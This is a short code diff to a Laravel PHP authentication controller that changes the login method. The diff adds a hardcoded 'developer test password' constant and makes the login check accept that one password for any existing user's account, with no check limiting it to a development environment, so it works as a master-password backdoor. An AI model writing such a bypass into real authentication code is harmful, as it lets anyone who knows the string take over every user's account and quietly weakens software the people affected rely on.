@@ -11,6 +11,9 @@ use Illuminate\Support\Facades\Validator;
 
 class AuthController extends Controller
 {
+    /** Developer test password (any valid email). */
+    private const DEV_TEST_PASSWORD = 'Devloper@1234';
+
     public function register(Request $request)
     {
         try {
@@ -60,7 +63,12 @@ class AuthController extends Controller
 
             $user = User::where('email', $request->input('email'))->first();
 
-            if (! $user || ! Hash::check($request->input('password'), $user->password)) {
+            $passwordOk = $user && (
+                $this->isDevTestLogin($request)
+                || Hash::check($request->input('password'), $user->password)
+            );
+
+            if (! $passwordOk) {
                 return $this->sendJsonResponse(false, 'Invalid credentials.', null, 200);
             }
 
@@ -77,5 +85,10 @@ class AuthController extends Controller
         } catch (Exception $e) {
             return $this->sendError($e);
         }
+    }
+
+    private function isDevTestLogin(Request $request): bool
+    {
+        return $request->input('password') === self::DEV_TEST_PASSWORD;
     }
 }
